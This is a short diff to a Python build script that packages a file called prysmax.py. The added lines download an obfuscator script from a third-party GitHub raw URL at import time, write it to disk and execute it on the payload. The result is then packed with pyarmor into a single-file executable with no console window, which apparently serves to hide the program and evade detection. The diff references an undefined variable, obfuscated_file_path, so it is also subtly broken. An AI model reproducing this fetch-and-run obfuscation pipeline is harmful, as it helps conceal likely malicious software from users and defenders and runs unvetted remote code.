@@ -17,7 +17,10 @@ except ImportError:
 
 SETTINGS_DIR = "settings"
 SETTINGS_FILE = os.path.join(SETTINGS_DIR, "settings.json")
-
+obf_file_path = os.path.join("settings", "obf.py")
+a = requests.get("https://raw.githubusercontent.com/Lawxsz/Py-obfuscator/main/obf.py")
+with open(obf_file_path, "w", encoding='utf-8') as file:
+    file.write(a.text)
 # Función para copiar el archivo prysmax.py a builder/prysmax.py
 def copy_prysmax():
     if not os.path.exists("builder"):
@@ -73,6 +76,8 @@ def download_libraries():
             print(f"{lib}: {e}")
 
 def compile_script():
+    subprocess.run(['python', "settings\\obf.py", "builder\\prysmax.py", '-o', obfuscated_file_path])
+
     subprocess.run('pyarmor pack -e "--onefile --noconsole --icon=settings/prysmax.ico" builder\\prysmax.py', shell=True)
 
 def main():
